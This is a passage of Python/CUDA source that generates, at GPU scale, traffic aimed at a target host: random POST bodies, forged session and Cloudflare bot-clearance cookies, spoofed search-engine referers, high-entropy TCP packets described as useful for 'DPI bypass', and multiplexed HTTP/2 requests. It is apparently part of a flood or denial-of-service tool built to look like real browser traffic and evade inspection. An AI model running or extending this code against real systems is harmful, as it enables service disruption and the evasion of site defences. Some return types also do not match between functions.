        if current_depth >= depth:
            # Leaf values
            value_type = random.randint(0, 3)
            if value_type == 0:  # String
                s = ''.join(random.choices(string.ascii_letters, k=random.randint(5, 15)))
                return f'"{s}"'
            elif value_type == 1:  # Number
                return str(random.randint(0, 10000))
            elif value_type == 2:  # Boolean
                return random.choice(["true", "false"])
            else:  # Null
                return "null"
        else:
            # Nested object
            if random.random() > 0.5:
                # Object
                inner_fields = []
                for _ in range(random.randint(2, 4)):
                    key = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
                    val = generate_value(current_depth + 1)
                    inner_fields.append(f'"{key}":{val}')
                return "{" + ",".join(inner_fields) + "}"
            else:
                # Array
                items = [generate_value(current_depth + 1) for _ in range(random.randint(2, 4))]
                return "[" + ",".join(items) + "]"
    
    fields = []
    field_names = ["data", "user", "request", "payload", "params", "query", "body", "content"]
    
    for _ in range(field_count):
        name = random.choice(field_names)
        value = generate_value(0)
        fields.append(f'"{name}":{value}')
    
    return ("{" + ",".join(fields) + "}").encode('utf-8')


def generate_xml_body(element_count: int = 5) -> bytes:
    """
    Generate a random XML POST body.
    
    Args:
        element_count: Number of XML elements
    
    Returns:
        XML body bytes
    """
    elements = []
    element_names = ["item", "data", "entry", "record", "field", "value", "node"]
    
    for i in range(element_count):
        name = random.choice(element_names)
        value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 20)))
        elements.append(f"  <{name}>{value}</{name}>")
    
    joined_elements = "\n".join(elements)
    xml_data = f"""<?xml version="1.0" encoding="UTF-8"?>
<request>
{joined_elements}
</request>"""
    
    return xml_data.encode('utf-8')


class POSTBodyGenerator:
    """
    Generator for various POST body types with GPU buffer support.
    """
    
    def __init__(self, count: int, max_body_size: int = MAX_POST_BODY):
        """
        Initialize POST body generator.
        
        Args:
            count: Number of bodies to generate
            max_body_size: Maximum body size per request
        """
        self.count = count
        self.max_body_size = max_body_size
        
    def generate_form_bodies(self) -> cp.ndarray:
        """Generate form-urlencoded bodies on GPU."""
        bodies = []
        for _ in range(self.count):
            body = generate_form_body(random.randint(3, 8))
            # Pad to max size
            body = body[:self.max_body_size].ljust(self.max_body_size, b'\x00')
            bodies.append(body)
        
        flat = b''.join(bodies)
        return cp.array(np.frombuffer(flat, dtype=np.uint8))
    
    def generate_json_bodies(self) -> cp.ndarray:
        """Generate JSON bodies on GPU."""
        bodies = []
        for _ in range(self.count):
            body = generate_json_body(random.randint(1, 3), random.randint(3, 6))
            body = body[:self.max_body_size].ljust(self.max_body_size, b'\x00')
            bodies.append(body)
        
        flat = b''.join(bodies)
        return cp.array(np.frombuffer(flat, dtype=np.uint8))
    
    def get_body_lengths(self, bodies_gpu: cp.ndarray) -> cp.ndarray:
        """Calculate actual body lengths (before null padding)."""
        # This is done on CPU for simplicity
        bodies_np = cp.asnumpy(bodies_gpu).reshape(self.count, self.max_body_size)
        lengths = []
        for body in bodies_np:
            # Find first null byte
            null_pos = np.where(body == 0)[0]
            if len(null_pos) > 0:
                lengths.append(null_pos[0])
            else:
                lengths.append(self.max_body_size)
        return cp.array(lengths, dtype=cp.uint32)


# ============================================================================
# Cookie Generation
# ============================================================================

def generate_session_cookie() -> str:
    """Generate a realistic session cookie value."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))


def generate_csrf_token() -> str:
    """Generate a CSRF token."""
    import hashlib
    return hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]


class CookieGenerator:
    """
    Generates realistic browser cookies for HTTP requests.
    """
    
    # Common cookie names
    COOKIE_TEMPLATES = [
        ("sessionid", lambda: generate_session_cookie()),
        ("csrftoken", lambda: generate_csrf_token()),
        ("_ga", lambda: f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}"),
        ("_gid", lambda: f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}"),
        ("_fbp", lambda: f"fb.1.{int(time.time()*1000)}.{random.randint(100000000, 999999999)}"),
        ("PHPSESSID", lambda: ''.join(random.choices(string.ascii_lowercase + string.digits, k=26))),
        ("JSESSIONID", lambda: ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))),
        ("__cf_bm", lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=44))),
        ("cf_clearance", lambda: ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=40))),
    ]
    
    def __init__(self, count: int, cookies_per_request: int = 4):
        """
        Initialize cookie generator.
        
        Args:
            count: Number of cookie strings to generate
            cookies_per_request: Number of cookies per request
        """
        self.count = count
        self.cookies_per_request = cookies_per_request
        
    def generate(self) -> List[str]:
        """Generate list of Cookie header values."""
        cookies = []
        for _ in range(self.count):
            selected = random.sample(self.COOKIE_TEMPLATES, 
                                    min(self.cookies_per_request, len(self.COOKIE_TEMPLATES)))
            cookie_parts = [f"{name}={generator()}" for name, generator in selected]
            cookies.append("; ".join(cookie_parts))
        return cookies
    
    def generate_gpu_array(self) -> Tuple[cp.ndarray, cp.ndarray, cp.ndarray]:
        """
        Generate cookies as GPU arrays.
        
        Returns:
            Tuple of (flat_data, offsets, lengths)
        """
        cookies = self.generate()
        return prepare_string_array(cookies)


# ============================================================================
# Referer Header Generation
# ============================================================================

class RefererGenerator:
    """
    Generates realistic Referer headers for HTTP requests.
    """
    
    REFERER_PATTERNS = [
        "https://www.google.com/search?q={query}",
        "https://www.google.com/",
        "https://www.bing.com/search?q={query}",
        "https://duckduckgo.com/?q={query}",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.reddit.com/r/{subreddit}",
        "https://www.linkedin.com/",
        "https://news.ycombinator.com/",
        "{target}/",
        "{target}/login",
        "{target}/products",
    ]
    
    SEARCH_QUERIES = [
        "buy online", "best deals", "login page", "sign up",
        "product review", "compare prices", "how to", "download"
    ]
    
    SUBREDDITS = ["technology", "programming", "news", "worldnews", "gaming"]
    
    def __init__(self, target_host: str, count: int):
        """
        Initialize referer generator.
        
        Args:
            target_host: Target hostname (for self-referencing)
            count: Number of referers to generate
        """
        self.target_host = target_host
        self.count = count
        
    def generate(self) -> List[str]:
        """Generate list of Referer header values."""
        referers = []
        for _ in range(self.count):
            pattern = random.choice(self.REFERER_PATTERNS)
            referer = pattern.format(
                query=random.choice(self.SEARCH_QUERIES).replace(" ", "+"),
                subreddit=random.choice(self.SUBREDDITS),
                target=f"https://{self.target_host}"
            )
            referers.append(referer)
        return referers
    
    def generate_gpu_array(self) -> Tuple[cp.ndarray, cp.ndarray, cp.ndarray]:
        """Generate referers as GPU arrays."""
        referers = self.generate()
        return prepare_string_array(referers)


# ============================================================================
# Variable Length Entropy Generator
# ============================================================================

@cuda.jit
def generate_variable_entropy_kernel(packets_buffer, rng_states, count, max_packet_size,
                                     min_payload_len, max_payload_len, target_ip_int, has_ethernet):
    """
    Fills the payload area with variable-length high-entropy data.
    
    Args:
        packets_buffer: Output buffer
        rng_states: RNG states
        count: Number of packets
        max_packet_size: Maximum packet size
        min_payload_len: Minimum payload length
        max_payload_len: Maximum payload length
        target_ip_int: Target IP as integer
        has_ethernet: Whether packets include Ethernet header
    """
    idx = cuda.grid(1)
    if idx >= count:
        return

    # Determine Offsets
    eth_len = 14 if has_ethernet else 0
    ip_len = 20
    tcp_len_hdr = 40
    
    header_offset = eth_len + ip_len + tcp_len_hdr
    pkt_start = idx * max_packet_size
    payload_start = pkt_start + header_offset
    
    # Variable payload length
    rand_len = xoroshiro128p_uniform_float32(rng_states, idx)
    payload_len = min_payload_len + int(rand_len * (max_payload_len - min_payload_len))
    
    # Ensure we don't exceed buffer
    if payload_len > max_packet_size - header_offset:
        payload_len = max_packet_size - header_offset
    
    # Generate random bytes using XOR pattern for variety
    seed = int(xoroshiro128p_uniform_float32(rng_states, idx) * 0xFFFFFFFF)
    
    for i in range(0, payload_len, 4):
        # Simple LCG for fast random generation
        seed = (seed * 1103515245 + 12345) & 0xFFFFFFFF
        
        bytes_to_write = min(4, payload_len - i)
        for b in range(bytes_to_write):
            packets_buffer[payload_start + i + b] = (seed >> (b * 8)) & 0xFF
    
    # Update Lengths and Checksums
    total_ip_len = ip_len + tcp_len_hdr + payload_len
    
    # Update IP Total Length
    ip_offset = pkt_start + eth_len
    packets_buffer[ip_offset + 2] = (total_ip_len >> 8) & 0xFF
    packets_buffer[ip_offset + 3] = total_ip_len & 0xFF
    
    # Recalculate IP Checksum
    packets_buffer[ip_offset + 10] = 0
    packets_buffer[ip_offset + 11] = 0
    ip_csum = calculate_checksum(packets_buffer, ip_offset, ip_len)
    packets_buffer[ip_offset + 10] = (ip_csum >> 8) & 0xFF
    packets_buffer[ip_offset + 11] = ip_csum & 0xFF
    
    # Update TCP Checksum
    transport_offset = ip_offset + ip_len
    tcp_total_len = tcp_len_hdr + payload_len
    
    # Read Source IP
    src_ip = (packets_buffer[ip_offset + 12] << 24) | (packets_buffer[ip_offset + 13] << 16) | \
             (packets_buffer[ip_offset + 14] << 8) | packets_buffer[ip_offset + 15]
             
    # Zero TCP Checksum
    packets_buffer[transport_offset + 16] = 0
    packets_buffer[transport_offset + 17] = 0
    
    tcp_csum = calculate_tcp_checksum_optimized(packets_buffer, transport_offset, tcp_total_len, src_ip, target_ip_int)
    packets_buffer[transport_offset + 16] = (tcp_csum >> 8) & 0xFF
    packets_buffer[transport_offset + 17] = tcp_csum & 0xFF


class VariableEntropyGenerator:
    """
    Generator for variable-length high-entropy payloads.
    Useful for DPI bypass and stress testing.
    """
    
    def __init__(self, count: int, max_packet_size: int = 1500,
                 min_payload: int = 100, max_payload: int = 1000):
        """
        Initialize entropy generator.
        
        Args:
            count: Number of packets
            max_packet_size: Maximum packet size
            min_payload: Minimum payload length
            max_payload: Maximum payload length
        """
        self.count = count
        self.max_packet_size = max_packet_size
        self.min_payload = min_payload
        self.max_payload = max_payload
        self.rng_states = create_xoroshiro128p_states(count, seed=random.randint(0, 0xFFFFFFFF))
        self.packets_gpu = cp.zeros((count * max_packet_size), dtype=cp.uint8)
        
    def generate(self, target_ip: str, has_ethernet: bool = True, stream=None) -> cp.ndarray:
        """
        Generate entropy-filled packets.
        
        Args:
            target_ip: Target IP address
            has_ethernet: Include Ethernet header
            stream: CUDA stream
            
        Returns:
            GPU buffer with packets
        """
        target_ip_int = sum([int(x) << (24 - i*8) for i, x in enumerate(target_ip.split('.'))])
        
        threads_per_block = 256
        blocks_per_grid = (self.count + (threads_per_block - 1)) // threads_per_block
        
        generate_variable_entropy_kernel[blocks_per_grid, threads_per_block, stream](
            self.packets_gpu, self.rng_states, self.count, self.max_packet_size,
            self.min_payload, self.max_payload, target_ip_int, 1 if has_ethernet else 0
        )
        
        return self.packets_gpu


# ============================================================================
# HTTP/2 Basic Support
# ============================================================================

# HTTP/2 Frame Types
H2_FRAME_DATA = 0x00
H2_FRAME_HEADERS = 0x01
H2_FRAME_PRIORITY = 0x02
H2_FRAME_RST_STREAM = 0x03
H2_FRAME_SETTINGS = 0x04
H2_FRAME_PUSH_PROMISE = 0x05
H2_FRAME_PING = 0x06
H2_FRAME_GOAWAY = 0x07
H2_FRAME_WINDOW_UPDATE = 0x08
H2_FRAME_CONTINUATION = 0x09

# HTTP/2 Flags
H2_FLAG_END_STREAM = 0x01
H2_FLAG_END_HEADERS = 0x04
H2_FLAG_PADDED = 0x08
H2_FLAG_PRIORITY = 0x20


def create_h2_settings_frame() -> bytes:
    """Create an HTTP/2 SETTINGS frame."""
    # Settings: HEADER_TABLE_SIZE(1)=4096, ENABLE_PUSH(2)=1, MAX_CONCURRENT_STREAMS(3)=100,
    #           INITIAL_WINDOW_SIZE(4)=65535, MAX_FRAME_SIZE(5)=16384, MAX_HEADER_LIST_SIZE(6)=8192
    settings = [
        (0x01, 4096),    # HEADER_TABLE_SIZE
        (0x02, 1),       # ENABLE_PUSH
        (0x03, 100),     # MAX_CONCURRENT_STREAMS
        (0x04, 65535),   # INITIAL_WINDOW_SIZE
        (0x05, 16384),   # MAX_FRAME_SIZE
        (0x06, 8192),    # MAX_HEADER_LIST_SIZE
    ]
    
    payload = b''
    for setting_id, value in settings:
        payload += setting_id.to_bytes(2, 'big') + value.to_bytes(4, 'big')
    
    # Frame header: Length (3 bytes) + Type (1) + Flags (1) + Stream ID (4)
    length = len(payload)
    frame_header = (
        length.to_bytes(3, 'big') +
        bytes([H2_FRAME_SETTINGS]) +
        bytes([0x00]) +  # No flags
        bytes([0, 0, 0, 0])  # Stream ID 0
    )
    
    return frame_header + payload


def create_h2_headers_frame(stream_id: int, headers: List[Tuple[str, str]], 
                            end_stream: bool = False) -> bytes:
    """
    Create an HTTP/2 HEADERS frame with simple encoding.
    
    Note: This uses a simplified encoding, not full HPACK compression.
    For production use, proper HPACK implementation is needed.
    
    Args:
        stream_id: Stream ID
        headers: List of (name, value) tuples
        end_stream: Set END_STREAM flag
        
    Returns:
        Frame bytes
    """
    # Simplified header encoding (literal without indexing)
    payload = b''
    for name, value in headers:
        name_bytes = name.lower().encode('utf-8')
        value_bytes = value.encode('utf-8')
        
        # Literal Header Field without Indexing
        payload += bytes([0x00])  # No indexing prefix
        payload += bytes([len(name_bytes)]) + name_bytes
        payload += bytes([len(value_bytes)]) + value_bytes
    
    # Frame header
    length = len(payload)
    flags = H2_FLAG_END_HEADERS
    if end_stream:
        flags |= H2_FLAG_END_STREAM
    
    frame_header = (
        length.to_bytes(3, 'big') +
        bytes([H2_FRAME_HEADERS]) +
        bytes([flags]) +
        stream_id.to_bytes(4, 'big')
    )
    
    return frame_header + payload


def create_h2_data_frame(stream_id: int, data: bytes, end_stream: bool = True) -> bytes:
    """
    Create an HTTP/2 DATA frame.
    
    Args:
        stream_id: Stream ID
        data: Payload data
        end_stream: Set END_STREAM flag
        
    Returns:
        Frame bytes
    """
    length = len(data)
    flags = H2_FLAG_END_STREAM if end_stream else 0x00
    
    frame_header = (
        length.to_bytes(3, 'big') +
        bytes([H2_FRAME_DATA]) +
        bytes([flags]) +
        stream_id.to_bytes(4, 'big')
    )
    
    return frame_header + data


class HTTP2PayloadGenerator:
    """
    Generator for HTTP/2 payloads.
    
    Note: This is a basic implementation. Full HTTP/2 requires:
    - Proper HPACK header compression
    - TLS (ALPN negotiation)
    - Connection preface handling
    - Flow control
    """
    
    CONNECTION_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    
    def __init__(self, target_host: str, count: int):
        """
        Initialize HTTP/2 payload generator.
        
        Args:
            target_host: Target hostname
            count: Number of requests to generate
        """
        self.target_host = target_host
        self.count = count
        
    def generate_get_request(self, path: str, stream_id: int = 1) -> bytes:
        """
        Generate a simple HTTP/2 GET request.
        
        Args:
            path: Request path
            stream_id: HTTP/2 stream ID (must be odd for client-initiated)
            
        Returns:
            Request bytes
        """
        headers = [
            (":method", "GET"),
            (":path", path),
            (":scheme", "https"),
            (":authority", self.target_host),
            ("user-agent", random.choice(DEFAULT_USER_AGENTS)),
            ("accept", "*/*"),
        ]
        
        return create_h2_headers_frame(stream_id, headers, end_stream=True)
    
    def generate_post_request(self, path: str, body: bytes, 
                               content_type: str = "application/json",
                               stream_id: int = 1) -> bytes:
        """
        Generate an HTTP/2 POST request.
        
        Args:
            path: Request path
            body: Request body
            content_type: Content-Type header value
            stream_id: HTTP/2 stream ID
            
        Returns:
            Request bytes
        """
        headers = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", self.target_host),
            ("content-type", content_type),
            ("content-length", str(len(body))),
            ("user-agent", random.choice(DEFAULT_USER_AGENTS)),
        ]
        
        headers_frame = create_h2_headers_frame(stream_id, headers, end_stream=False)
        data_frame = create_h2_data_frame(stream_id, body, end_stream=True)
        
        return headers_frame + data_frame
    
    def generate_connection_setup(self) -> bytes:
        """Generate HTTP/2 connection setup (preface + SETTINGS)."""
        return self.CONNECTION_PREFACE + create_h2_settings_frame()
    
    def generate_multiplexed_requests(self, paths: List[str], 
                                       max_concurrent: int = 10) -> bytes:
        """
        Generate multiple multiplexed HTTP/2 requests.
        
        Args:
            paths: List of paths to request
            max_concurrent: Maximum concurrent streams
            
        Returns:
            Combined request bytes
        """
        frames = self.generate_connection_setup()
        
        stream_id = 1
        for path in paths[:max_concurrent]:
            frames += self.generate_get_request(path, stream_id)
            stream_id += 2  # Client streams are odd-numbered
        
        return frames


# ============================================================================
# Utility Functions
# ============================================================================

def prepare_string_array(string_list: List[str]) -> Tuple[cp.ndarray, cp.ndarray, cp.ndarray, int]:
    """
    Flattens a list of strings into a single byte array and offset/len arrays for GPU.
    
    Args:
        string_list: List of strings
        
    Returns:
        Tuple of (flat_data, offsets, lengths, count)
    """
    flat_data = b"".join([s.encode('utf-8') if isinstance(s, str) else s for s in string_list])
    offsets = []
    lengths = []
    current_off = 0
    
    for s in string_list:
        l = len(s) if isinstance(s, str) else len(s)
        offsets.append(current_off)
        lengths.append(l)
        current_off += l
        
    return (
        cp.array(list(flat_data), dtype=cp.uint8),
        cp.array(offsets, dtype=cp.uint32),
        cp.array(lengths, dtype=cp.uint32),
        len(string_list)
    )


def get_content_type_header(content_type: int) -> str:
    """Get Content-Type header value from constant."""
    types = {
        CONTENT_TYPE_FORM: "application/x-www-form-urlencoded",
        CONTENT_TYPE_JSON: "application/json",
        CONTENT_TYPE_XML: "application/xml",
        CONTENT_TYPE_MULTIPART: "multipart/form-data",
        CONTENT_TYPE_PLAIN: "text/plain"
    }
    return types.get(content_type, "application/octet-stream")


def get_method_string(method: int) -> str:
    """Get HTTP method string from constant."""
    methods = {
        HTTP_GET: "GET",
        HTTP_POST: "POST",
        HTTP_HEAD: "HEAD",
        HTTP_PUT: "PUT",
        HTTP_DELETE: "DELETE",
        HTTP_OPTIONS: "OPTIONS",
        HTTP_PATCH: "PATCH"
    }
    return methods.get(method, "GET")
